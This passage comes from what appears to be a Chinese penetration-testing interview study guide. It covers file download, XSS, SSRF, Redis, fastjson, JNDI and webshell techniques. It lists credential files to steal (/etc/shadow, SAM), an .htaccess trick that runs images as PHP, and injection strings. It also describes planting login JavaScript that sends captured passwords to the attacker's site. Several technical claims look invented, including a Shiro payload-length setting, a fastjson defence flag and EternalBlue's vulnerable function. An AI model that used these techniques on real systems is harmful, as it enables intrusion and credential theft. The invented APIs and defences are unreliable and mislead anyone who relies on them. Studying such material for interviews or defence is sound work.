/etc/sudoers</code> )，数据库文件( <code>/var/lib/mysql/</code> )，其它敏感文件( <code>/home/admin/</code> )</p><p><a href="https://blog.csdn.net/weixin_43148062/article/details/105496744">渗透测试-任意文件下载漏洞</a></p><ol start="25"><li>xxe漏洞攻击原理是什么？如何找xxe漏洞及攻击方法</li></ol><p>见问题13</p><ol start="26"><li>xxe攻击在无回显的时候是怎么突破的？</li></ol><p>见问题13</p><ol start="27"><li>如何防范xxe漏洞？</li></ol><p>见问题13</p><ol start="28"><li>越权问题有哪些？实战</li></ol><p>越权见问题24</p><p>实战：<br>攻击场景：<br>(1) 登录<br>未授权访问:可尝试修改响应码，从链接访问从而绕过，人为疏忽导致密码暴露。<br>身份或登录信息伪造：将身份或登录信息简单编码(Base64)加密(MD5)后放在链接中或数据包中<br>(2) 数据<br>身份信息伪造：身份校验采用明文或简单编码加密。<br>数据篡改：正负值反冲，修改订单数据，修改商品ID等。发送信息或邮件等可以尝试爆破构成短信&#x2F;邮件轰炸。<br>流程越过：越过中间校验步骤直接进行后续操作。<br><a href="https://www.freebuf.com/vuls/313396.html">实战中的越权攻击总结</a></p><ol start="29"><li>URL跳转漏洞</li></ol><p>URL跳转漏洞（Open Redirect Vulnerability）是一种常见的Web安全漏洞，攻击者可通过构造恶意链接，引导用户跳转到恶意网站，从而窃取用户敏感信息等。常见的URL跳转漏洞发生原因一般是在程序中没有对跳转URL进行有效的过滤和校验，攻击者可以通过构造链接，在跳转URL中注入恶意代码或者外部URL，从而实现对跳转流程的控制。<br>绕过方式：@绕过，?绕过，#绕过，斜杠(&#x2F;)绕过，反斜杠(\)绕过，白名单匹配绕过，xip.io绕过，协议绕过，xss跳转。<br>fuzz的参数： <code>redirect, url, redirecturl, callback, return_url, toUrl, jump, target, to, link, domain</code></p><p>实战：登录跳转，充值接口跳转，xss造成的url跳转</p><ol start="30"><li>ARP欺骗的方法有哪些？说说原理</li></ol><p>见问题14</p><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li>如果遇到waf的情况如何进行sql注入&#x2F;上传webshell怎么做？请写出曾经绕过WAF的经过。</li></ol><p>遇到waf首先查看是哪家的waf，然后网上查找相关资料或询问有关人员根据waf的漏洞进行绕过。</p><ol start="2"><li>拿到一个待测的站，首先应该做什么？</li></ol><p>信息收集：获取域名的whois信息，注册者邮箱电话等。通过站长之家，明小子，k8等查询服务器旁站，C段及子域名站点。服务器操作系统的版本、中间件、数据库类型，前端语言，后端语言，开放端口，真实IP，网站指纹。Google hack进一步收集网站信息，后台，敏感文件等。qq，邮箱，身份证，电话使用社工库反查。</p><p>漏洞扫描：nmap，御剑，dirbuster，sqlmap，burp，metasploit，nessus，AWVS，goby</p><p>漏洞利用…<br><a href="https://blog.csdn.net/m0_45097365/article/details/122831464">渗透测试流程</a></p><ol start="3"><li>判断出网站的CMS对渗透有什么意义？</li></ol><p>可以查找已知的漏洞了解弱点，如果是开源CMS，可以将源码下载进行审计。</p><ol start="4"><li>一个成熟并且相对安全的CMS，渗透时扫目录的意义？</li></ol><p>敏感文件、二级目录扫描<br>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p><ol start="5"><li>在某后台新闻编辑界面看到编辑器，应该先做什么？</li></ol><p>查看编辑器的名称版本,然后搜索公开的漏洞。</p><ol start="6"><li>拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</li></ol><p>能做很多事，如上传.htaccess文件并上传图片码，获取网站的权限<br>插入 <code>&lt;FilesMatcher &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php</code> .jpg文件会被解析成.php文件。<br>.htaccess 文件可以用来重写 URL，这是比较常见的一种用法。攻击者可以使用它来欺骗用户，让用户访问一个恶意网站，或者重定向到钓鱼站点等</p><ol start="7"><li>注入漏洞只能查账号密码？</li></ol><p>还可以修改数据库，进行DDoS攻击，执行任意代码。</p><ol start="8"><li>安全狗会追踪变量，从而发现是一句话木马吗？</li></ol><p>不是，是根据特征码，所以只要更改特征码即可。</p><ol start="9"><li>.access扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？</li></ol><p>迅雷下载，直接改后缀为.mdb</p><ol start="10"><li>如何利用这个防注入系统拿shell？<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">某个防注入系统，在注入时会提示：</span><br><span class="line">系统检测到你有非法注入的行为。</span><br><span class="line">已记录您的IP:xxx.xxx.xx.xx</span><br><span class="line">时间:yy:mm:dd</span><br><span class="line">提交页面: test.asp?id=15</span><br><span class="line">提交内容: and 1=1</span><br></pre></td></tr></table></figure></li></ol><p>在URL里面直接提交一句话，然后网站就会把提交内容记录进数据库文件，之后尝试查找网站的配置文件，使用shell连接工具(如：蚁剑)</p><ol start="11"><li>上传大马后访问乱码时，有哪些解决办法？</li></ol><p>浏览器中改编码</p><ol start="12"><li>审查上传点的元素有什么意义？</li></ol><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制。</p><ol start="13"><li>目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</li></ol><p>直接爆破用户名。根据报错信息判断出哪些用户是存在的。然后利用爆破出的用户名更改密码。</p><ol start="14"><li>以下条件有什么思路？<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标站发现某txt的下载地址为：</span><br><span class="line">http://www.test.com/down/down.php?file=/upwdown/1.txt</span><br></pre></td></tr></table></figure></li></ol><p>下载漏洞。已经知道下载点了，直接尝试下载敏感文件配置文件等。如 <code>linux下可以: /etc/passwd  /etc/shadow   Windows下可以: C:\Windows\win.ini  C:\Windows\repair\sam</code> 。也可以输入index.php下载首页文件，然后在首页文件里查找其它文件网站的配置文件，找出网站的数据库密码和数据库的地址。</p><ol start="15"><li>甲给你一个目标站，并且告诉你根目录下存在&#x2F;abc&#x2F;目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</li></ol><p>直接在网站二级目录 <code>/abc/</code> 下扫描敏感文件及目录。</p><ol start="16"><li>在有shell的情况下，如何使用xss实现对目标站的长久控制？</li></ol><p>后台登录处加一段记录登录账号的JS，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件或直接发到自己的网站文件中。（此方式适合有价值且需要深入控制权限的网络）<br>在登录后才可以访问的文件中插入XSS脚本。</p><ol start="17"><li>发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取webshell，哪种是优选？</li></ol><p>有写入权限的，构造联合查询语句使用 using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个Shell，这样效率更高。通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p><ol start="18"><li>CSRF和XSS和XXE有什么区别，以及修复方式？</li></ol><p>XSS 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用 HTTP Only 来禁止 JavaScript 读取 Cookie 值、输入时校验、浏览器与 Web 应用端采用相同的字符编码。</p><p>CSRF 是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验 Referer</p><p>XXE 是 XML 外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML 解析库在调用时严格禁止对外部实体的解析。</p><ol start="19"><li>CSRF、SSRF和重放攻击有什么区别？</li></ol><p>CSRF 是跨站请求伪造攻击，由客户端发起<br>SSRF 是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p><ol start="20"><li>XSS、CSRF、CRLF比较容易弄混，说说三者的原理，防御方法。</li></ol><p>CSRF跨站请求伪造，构造已知的所有参数让对方访问。</p><p>防护CSRF原理：防御原理：不让你那么容易伪造请求（cookie中加入随机数，要求请求中带上，而攻击者获取不到cookie中的随机数，验证HTTP Referer字段，在请求地址中添加token字段）</p><p>CRLF原理：HTTP拆分攻击（HTTP Splitting），CRLF是“回车+换行”（\r\n）的简称。<br>在HTTP协议中，HTTP Header与HTTP body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头的字符，注入一些恶意换行，这样就能注入一些会话Cookie或HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><ol start="21"><li>owasp漏洞都有哪些？</li></ol><p>(1) 失效的访问控制<br>(2) 加密机制失效<br>(3) 注入<br>(4) 不安全的设计<br>(5) 安全配置错误<br>(6) 易受攻击和过时的组件<br>(7) 识别和认证失败<br>(8) 软件和数据完整性故障<br>(9) 安全日志记录和监控失败<br>(10) 服务端请求伪造SSRF<br><a href="https://www.secrss.com/articles/55490">2023 OWASP API Security Top 10</a><br><a href="https://blog.csdn.net/Gherbirthday0916/article/details/126786601">2022 OWASP</a></p><ol start="22"><li>渗透测试中常见端口？</li></ol><p>文件共享服务端口：21(FTP), 22(SSH), 69(TFTP)<br>远程连接服务端口：22(SSH), 23(Telnet), 3389(RDP), 5900(VNC)<br>Web应用服务端口：53(DNS), (80, 443, 8080, 8443)(HTTP&#x2F;HTTPS), 7001(Weblogic)<br>数据库端口：1433(MSSQL), 1521(Oracle), 3306(MySQL), 5432(PostgreSQL), 27017(Mongodb), 6379(Redis)<br>邮件服务端口：25(SMTP), 110(POP3), 143(IMAP)<br><a href="https://blog.51cto.com/jayjaydream/5850365">渗透测试入门15之常见端口安全测试</a><br><a href="https://www.freebuf.com/articles/web/333481.html">常见端口攻击方式</a></p><ol start="23"><li>网站渗透流程</li></ol><p>(1) 信息收集<br>包括目标确认和公开情报收集。<br>(2) 主动探测<br>包括主动扫描，人工浏览、逐个请求burp，自动化。<br>(3) 漏洞挖掘<br>漏洞扫描工具，挖掘漏洞<br><a href="https://www.freebuf.com/articles/web/270202.html">渗透测试全流程总结</a></p><ol start="24"><li>发现一个大范围影响的新漏洞，如何快速排查公司资产？</li></ol><p>(1) 了解漏洞的影响范围。包括漏洞类型、漏洞利用条件、漏洞危害等。根据漏洞影响范围，可以初步判断公司资产是否存在风险。<br>(2) 制定排查方案。根据漏洞的影响范围，制定排查方案。排查方案应包括排查资产范围、排查方法、排查流程、排查工具等。<br>(3) 快速排查资产。排查过程中应重点关注：使用了漏洞软件或设备的资产，存储了敏感数据的资产，连接到互联网的资产。<br>(4) 确认漏洞存在情况。排查完成后，需要确认漏洞是否存在于公司资产中。确认方法可以通过漏扫工具、人工检测等。<br>(5) 采取措施修复漏洞。如果确认漏洞存在，应立即采取措施修复漏洞。措施可采用升级软件、补丁修复等。</p><ol start="25"><li>怎样对一个站去挖nday</li></ol><p>首先进行信息搜集，确认已知漏洞。找到已知漏洞后，我们可以从网上找到已知漏洞的payload，尝试挖掘。</p><ol start="26"><li>跟过哪些nday，怎样一个思路</li></ol><p><a href="https://paper.seebug.org/2033/">WSO2文件上传漏洞</a></p><p><a href="https://www.cnblogs.com/R3col/p/16094132.html">Django SQL注入漏洞</a></p><ol start="27"><li>挖到过0day吗</li></ol><p>没有。</p><ol start="28"><li>代码审计</li></ol><p>有审计过VAudit，使用了Seay源代码审计系统。<br>审计出的漏洞有：<br>(1) 文件包含。源代码未进行严格过滤，仅添加后缀inc。直接创建shell.inc文件，写一句话木马。蚁剑连接成功。<br>(2) sql注入。在留言界面未对用户输入的id字段做检测，仅有敏感字符替换。因为替换字段中 <code>||</code> 被替换为空，所以我们可将其插入到敏感字符中间绕过。<br>(3) 反射型XSS。搜索留言处存在。<br>(4) 登录次数未做限制可爆破。登录处，管理员账户。无验证可python爆破，有验证burp爆破。<br>(5) 命令执行。<br>(6) 任意文件读取。查看avatar.php源代码：存在危险函数 <code>file_get_contents</code> ，通过代码审计发现 <code>$_SESSION[&#39;avatar&#39;]</code> 。数据可控。<br>(7) 安装漏洞。查看install.php的代码时就算存在install.lock文件依然会执行后面的代码，数据库连接参数由用户上传可控，仅对dbname做了重复检测，未对参数进行校验，可进行SQL注入。使用反引号使SQL语句合法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&quot;;phpinfo();//`</span><br></pre></td></tr></table></figure><p>跟着文章审计过XXE漏洞。解密通达OA后，在日程安排功能点处，发现导入日程的说明描述是可上传XML格式文档。那么也可能解析XML实体，于是抓包去路由，查看版本并利用。详看文章。</p><p><a href="https://blog.csdn.net/akucoco/article/details/129032037">VAudit代码审计从0到1，思路记录</a><br><a href="https://www.freebuf.com/articles/web/341238.html">如何通过代码审计大型OA系统拿到CNVD证书</a><br><a href="https://juejin.cn/post/7129298288389390367">PHP代码审计（六）Seay源代码审计系统使用教程</a></p><ol start="29"><li>app渗透经历</li></ol><p>做过一个app渗透，大概是在去年暑假刚开始的时候，身边有个人被诈骗了。是在某个app内，所以我就尝试进行app渗透。如下：<br><a href="https://www.wangan.com/p/7fy7fx71176412a7">实战|从app渗透到网站沦陷</a><br><a href="https://blog.csdn.net/weixin_40228200/article/details/128474830">APP应用渗透测试思路</a></p><ol start="30"><li>redis利用姿势及环境差异</li></ol><p><strong>Linux</strong>：<br>(1) 未授权访问：默认直接绑定在0.0.0.0:6379，密码为空，未对ip、端口等限制，攻击者可未授权访问redis，轻则获取数据，重则配合其它漏洞取得服务器权限。redis3.2版本新增protected-mode，默认yes，外部网络无法访问redis服务。<br>利用方式：直接nmap扫描，然后直连。<br>(2) 利用config写配置文件。<br>利用方式：直连到redis后，一句话木马写入webshell。<br>Ubuntu下利用定时任务反弹shell<br>(3) 模块加载rce。redis4.0以上区别于以下的版本在于其多出一个模块，允许我们加载外部的so文件，实现在redis内执行我们的自定义命令，可以理解我们可以自写插件来扩展redis的功能。<br>利用方式：如果拿到webshell之后，登录redis后通过webshell上传动态链接库即so文件后，通过redis的moudle load加载动态链接库即可rce。权限一般可满足<br>(4) 主从复制RCE。主从复制是指将一台redis服务器的数据，复制到其它的redis服务器。前者称之为主节点(master)，后者称之为(slave)；主从复制是单向的，只能由主节点到从节点。<br>利用方式：通过全量复制。尝试在服务器中nc一个端口，然后我们的redis用slaveof命令<br>(5) SSRF打redis。SSRF因为一个gopher协议大大拓宽了攻击面，使用过gopher的会知道我们需要对需要发送的包进行抓包然后编码通过gopher协议进行发送。<br>利用方式：根据redis的数据格式伪造将webshell、ssh、定时任务等进行编码后通过gopher协议发送到存在着redis的机器上，就可以达成ssrf打redis。</p><p><strong>Windows</strong>：<br>(1) 写无损文件。<br>利用方式：使用工具RedisWriteFile。<br>(2) getshell。<br><a href="https://blog.csdn.net/weixin_50464560/article/details/121095951">Redis利用方式总结(Linux&#x2F;Windows)</a></p><ol start="31"><li>fastjson回显&#x2F;fastjson远程命令执行漏洞</li></ol><p>fastjson用于将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。</p><p>fastjson回显是指在使用fastjson解析json数据时，由于fastjson存在反序列化漏洞，攻击者可以通过构造恶意json数据，将恶意代码注入到服务端，从而实现远程代码执行、数据库操作等攻击。</p><p>fastjson回显漏洞主要存在于fastjson的 <code>JSON.parse()</code> 方法中，该方法用于将json字符串解析为Java对象。fastjson在解析json数据时，会将json字符串中的所有键值对都转换为Java对象，其中包括恶意代码。</p><p>利用BCEL打fastjson直接burp回显getshell<br>基于dbcp的fastjson rce回显<br>fastjson &lt;&#x3D; 1.2.24</p><p>渗透总结：<br>1、反序列化常用的两种利用方式，一种是基于rmi，一种是基于ldap。<br>2、RMI是一种行为，指的是Java远程方法调用。<br>3、JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。<br>4、ldap指轻量级目录服务协议。</p><p>fastjson 1.2.24反序列化导致任意命令执行漏洞（CVE-2017-18349）<br>漏洞原理<br>FastJson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p>防御：<br>升级fastjson到最新版本，最新版本已经修复了该漏洞。<br>在fastjson的配置文件中，设置 <code>deserializerFeatures</code> 属性为 <code>SerializerFeature.DisableFeatures.AUTO_DESERIALIZE_ENUM</code> ，该属性可以禁止fastjson自动反序列化枚举类型，从而防止攻击者利用枚举类型进行攻击。<br>使用第三方安全工具进行检测和修复。</p><p><a href="https://www.freebuf.com/articles/web/283585.html">Fastjson远程命令执行漏洞总结</a></p><ol start="32"><li>jndi注入及原理</li></ol><p>JDNI注入是指攻击者通过控制JNDI查询参数，将恶意代码或对象注入到JNDI服务中，从而导致远程代码执行的漏洞.<br>JNDI(Java Naming and Directory Interface)是Java提供的命名和目录接口。通过调用JNDI的API可以定位资源和其它程序对象。<br>JNDI是Java EE的重要部分，JNDI可访问的现有目录及服务有：JDBC, LDAP, RMI, DNS, NIS, CORBA.</p><p>JNDI注入，即当开发者在定义JNDI接口初始化时， <code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的url传入参数远程加载恶意载荷，造成注入攻击。</p><p><a href="https://xz.aliyun.com/t/12277">JNDI注入原理及利用考究</a></p><ol start="33"><li>Java回显</li></ol><p>(1) defineClass<br>(2) RMI绑定实例<br>(3) URLClassLoader抛出异常<br>(4) 中间件<br>(5) 写文件css、js<br>(6) dnslog</p><p><a href="https://xz.aliyun.com/t/7740">Java 反序列化回显的多种姿势</a></p><ol start="34"><li>泛微oa xstream的回显(jdk1.8和jdk1.7的差异)</li></ol><p><a href="https://cangqingzhe.github.io/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">泛微xstream</a></p><ol start="35"><li>shiro限制payload长度</li></ol><p>Shiro是一个流行的Java安全框架，可以作为应用程序的身份验证和授权解决方案。<br>在Shiro中，有一个限制payload长度的设置可以增加应用程序的安全性。<br>shiro限制payload长度的主要方法是设置SecurityManager的subjectFactory属性。subjectFactory属性用于创建subject对象，可以通过设置该属性的maxPayloadLength属性来限制payload的长度。<br>示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DefaultSubjectFactory</span> <span class="variable">subjectFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSubjectFactory</span>();</span><br><span class="line">subjectFactory.setMaxPayloadLength(<span class="number">1024</span>);</span><br><span class="line"><span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSecurityManager</span>(subjectFactory);</span><br></pre></td></tr></table></figure><p>该配置将限制payload的长度为1024字节。</p><p>除此之外还有：<br>在shiro的配置文件中设置SecurityFilterChain的filters属性。filters属性用于指定shiro的过滤器链，可以通过添加PayloadLengthFilter过滤器来限制payload的长度。<br>在shiro的配置文件中设置SecurityManager的subjectFactory属性的maxPrincipalLength属性。maxPrincipalLength属性用于限制principal的长度，principal是用于表示用户身份的对象。</p><ol start="36"><li>Java回显的通用思路以及不同版本jdk的差异</li></ol><p>Java回显的通用思路：<br>1、选择回显通道：首先，选择一个通道，通过该通道可以接收到目标系统的响应。通常使用的回显通道包括DNS、HTTP、SMTP等。<br>2、构造恶意Java对象：创建一个Java对象，该对象会在目标系统中触发漏洞或执行特定操作。通常，这需要深入了解目标系统上的漏洞或弱点，并构造适当的Java序列化对象来利用这些弱点。<br>3、序列化和发送对象：使用Java的序列化机制，将恶意对象序列化为字节流。然后，通过选择的通道将字节流发送到目标系统。<br>4、等待回显：监视回显通道，等待目标系统的响应。响应通常是由目标系统执行恶意对象引发的操作所触发的。<br>5、解析和分析回显：一旦收到回显，解析响应以确定是否成功触发了漏洞或执行了目标操作。这可能包括查看响应内容、状态码、错误消息等。<br>6、根据结果采取行动：根据回显的结果，确定目标系统是否受到漏洞的影响，并采取进一步的行动，例如报告漏洞或利用漏洞。</p><p>jdk7 存在Apache Commons Collections中的Collections.unrollMap方法的反序列化漏洞，可执行任意代码。安全配置方面：开发人员可以使用ObjectInputFilter来配置白名单规则以确保反序列化处理的对象合法可信，并使用 Javadoc 文档中提供的安全基线配置来提高安全性。<br>引入了新的特性，如try-with-resources语句，有助于更安全地处理资源关闭。</p><p>jdk8 存在Apache Commons Collections中的TransformerFactory.getClassLoader方法的反序列化漏洞，可被攻击者利用获取敏感信息。安全配置：引入了强化的Java安全管理器（Java Security Manager），默认情况下禁用了许多危险的操作。引入了全新的安全特性，如Strengthening Password-based Encryption，增强了密码散列算法（例如PBKDF2）。</p><p>jdk9 引入了模块化系统（Project Jigsaw），提供更好的代码隔离和控制，有助于减少潜在的安全问题。<br>引入了多版本JAR文件，有助于解决一些依赖性问题，从而提高安全性。</p><p>jdk11 JDK的ssl库存在信息泄露漏洞，攻击者可以针对受害者获取机密的信息。安全配置有通过设置Java安全管理器的allowList属性来指定允许反序列化的类。是一个LTS（长期支持）版本，将在较长时间内接收安全补丁和维护。引入了新的HTTP客户端（替代HttpURLConnection），提供更好的性能和安全性。</p><ol start="37"><li>Rootkit是什么意思</li></ol><p>rootkit是一种恶意软件，它可以隐藏自身和其它恶意软件，从而使攻击者可以获取对受感染系统的完全控制。rootkit通常使用系统漏洞来安装，并使用各种技术隐藏自身和其它恶意软件。</p><p>常见类型：<br>内核rootkit：内核rootkit是安装在操作系统内核中的rootkit，可访问和修改操作系统的所有部分，使其非常难以检测和删除。<br>文件系统rootkit：文件系统rootkit是安装在文件系统中的rootkit。文件系统rootkit可以隐藏自身和其他恶意软件，使其难以检测和删除。<br>网络rootkit：网络rootkit是用于攻击网络的rootkit。网络rootkit可以用于窃取敏感信息、进行远程攻击或破坏系统。</p><p>rootkit示例：Stuxnet, Flame, Necurs.</p><p>检测：比较困难。可根据特征推测，如蓝屏，异常网络浏览器行为，设备性能缓慢，Windows设置未经许可修改，网页运行不正常。<br>清除：如果有深度感染唯一办法是重装系统。<br><a href="https://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkit">什么是 Rootkit</a></p><ol start="38"><li>手工查找后门木马的小技巧</li></ol><p>1、首先最需要注意的地方是系统的启动项，可以在“运行”-输入“msconfig 命令” 在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，因为在后门木马中大部分都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；</p><p>2、查看系统关键目录 system32 和系统安装目录 Windows 下的文件，xp 系统下两者默认路径分别是 C:\WINDOWS\system32 和 C:\WINDOWS\。然后最新修改的文件中有没有可疑的可执行文件或 dll 文件，这两个地方都是木马最喜欢的藏身的地方了（小提示：一定要设置显示所有的文件的文件夹哦）。</p><p>3、观察网络连接是否存在异常，还有“运行”-“cmd”- <code>netstat -an</code> 查看有没有可疑或非正常程序的网络连接，尤其注意一下远程连接的端口，如果有类似于 8000 等端口就要注意了，8000 是灰鸽子的默认端口，记得有一次自己就在后门木马测试的网络连接中发现 8000 端口，当然意思不是说只要没有 8000 端口的网络连接就一定安全，因为 8000 端口只是灰鸽子上线的默认端口，并且端口是可以更改的。</p><p>通过以上方法，可以查找到电脑的一些可疑文件，如果确认无疑，就可以手工进行删除了。当然还可以借助杀毒软件的力量。如果你真的中了木马后门，不用慌。最好最彻底的方法是重装系统后，在安全模式下，利用最新病毒库的杀软进行查杀。</p><ol start="39"><li>常见web安全漏洞</li></ol><p>sql注入，文件上传，xss，文件包含，CSRF，SSRF，XXE，SSTI，反序列化，RCE，目录穿越，逻辑漏洞，中间件。</p><ol start="40"><li>永恒之蓝的漏洞原理是什么？怎么做到的？ms17-010</li></ol><p>原理：攻击者可以通过发送一个特制的SMB请求，导致Windows内核中的SmbSessionNegotiate函数发生缓冲区溢出。攻击者可以利用该漏洞执行任意代码，从而获得对受感染系统的完全控制。<br>漏洞类型：缓冲区溢出。<br>漏洞危害：攻击者可以利用该漏洞执行任意代码，从而获得对受感染系统的完全控制。</p><ol start="41"><li>针对PHP的弱类型，有哪些漏洞？</li></ol><p>(1) 类型转换漏洞：由于PHP的弱类型变量，在进行比较运算时会自动进行类型转换，攻击者可以利用此特性来触发特定的条件判断。例如，攻击者可以在比较两个值时传递一个特殊的参数，导致预期以外的结果。<br>(2) 对象漏洞：PHP中的对象也可以受到弱类型的影响，可能导致意外行为。要防范此类问题，应该在操作对象之前验证其类型和属性。<br>(3) 比较漏洞：PHP中的比较操作符（例如&#x3D;&#x3D;）在比较不同数据类型时可能会导致问题。攻击者可以利用类型弱化来绕过预期的条件。<br>(4) 数组漏洞：PHP中的数组也可以是弱类型的，这可能导致问题。例如，如果未初始化一个数组并尝试访问其元素，PHP可能会自动将数组初始化为空数组。为了防止这种情况，建议始终明确初始化数组并验证输入。<br>(5) SQL注入漏洞：由于弱类型变量的存在，攻击者可以通过传递恶意的SQL查询来注入数据库。攻击者可以伪造一个查询或输入等操作，绕过服务器端的验证和过滤机制，最终达到执行数据库操作的目的。</p><p>采取措施：<br>为了防范PHP中的弱类型漏洞，建议进行严格的输入验证、类型检查和转换，并使用适当的安全编码实践来确保应用程序的安全性。</p><ol start="42"><li>代码审计方面，有过对大型cms的审计吗？发现过哪些漏洞？</li></ol><p>同28题。</p><ol start="43"><li>针对PHP的语言特点，说几个常见漏洞？</li></ol><p>同41题。</p><ol start="44"><li><p>burpsuite加密用什么模块bp加密 burp加密<br>Decoder模块</p></li><li><p>应用有漏洞，无法修复和停用，应当怎么办？<br>1、隔离和监控： 将受漏洞影响的应用程序与其他系统隔离开来，以减少攻击的影响范围。同时，密切监视应用程序的活动，以侦测任何异常行为。<br>2、强化访问控制： 强化应用程序的访问控制，确保只有经过授权的用户能够访问关键功能和数据。使用强密码策略、多因素身份验证等方式提高访问控制的安全性。<br>3、应用补丁和安全配置： 尽量确保应用程序和相关组件的操作系统、数据库、中间件等都是最新版本，并且已经应用了相关的安全补丁。同时，配置这些组件的安全性设置，以减少攻击面。<br>4、网络防护措施： 在网络层面实施防火墙、入侵检测系统（IDS）和入侵防御系统（IPS）等措施，以减少恶意流量的影响。<br>5、数据加密： 对于敏感数据，使用加密来保护其机密性。这包括在数据传输过程中使用TLS&#x2F;SSL加密，以及在存储时使用适当的加密方法。<br>6、定期安全审计： 进行定期的安全审计和漏洞扫描，以及对应用程序进行渗透测试，以发现潜在的风险和漏洞。这有助于及早发现问题并采取纠正措施。<br>7、应急响应计划： 建立应急响应计划，以在发生安全事件时迅速采取措施。确保团队了解如何处理可能的威胁和攻击。</p></li><li><p>Jsonp劫持漏洞的原理、利用方式、防御方法<br>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。<br>JSONP实现跨域请求的原理简单的说，就是动态创建 <code>&lt;script&gt;</code> 标签，然后利用 <code>&lt;script&gt;</code> 的src不受同源策略约束来跨域获取数据。</p></li></ol><p>JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><p>jsonp劫持漏洞原理：利用 <code>&lt;script&gt;</code> 标签中的src属性没有跨域限制</p><p>利用方式：<br>收集接口：找到返回数据格式是JSONP的接口(可以在数据包中检索关键词callback json jsonp email, cb等，也可以加上callback,参数，观察返回值是否变化)<br>加参数看返回信息：加上callback参数，观察返回值是否变化，是否返回jsonp格式的信息<br>比如以下就是标准的JSONP格式的信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hehehe(<span class="punctuation">&#123;</span><span class="attr">&quot;customername1&quot;</span><span class="punctuation">:</span><span class="string">&quot;user1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;12345678&quot;</span><span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure><p>防御：<br>1、限制来源refer<br>2、在请求中添加 csrfToken 并在后端进行验证<br>3、按照JSON格式标准输出（设置Content-Type : application&#x2F;json; charset&#x3D;utf-8）<br>预防 <code>http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code> 形式的xss<br>4、过滤callback函数名以及JSON数据输出，预防xss</p><p><a href="https://www.cnblogs.com/yyhuni/p/15563994.html">JSONP劫持</a></p><ol start="47"><li>APP常见任意密码重置漏洞的挖掘方法<br>1、重要凭证泄露<br>验证码信息随请求一起发送到服务端，通过拦截数据包可发现正确验证码<br>构造修改密码的url中重要的参数在客户端请求中出现，可伪造目标邮箱中修改密码的url，达到任意修改密码的效果。<br>2、重要凭证可客户端篡改<br>抓包篡改<br>3、用户混淆<br>密码找回逻辑含有用户标识（用户名、用户 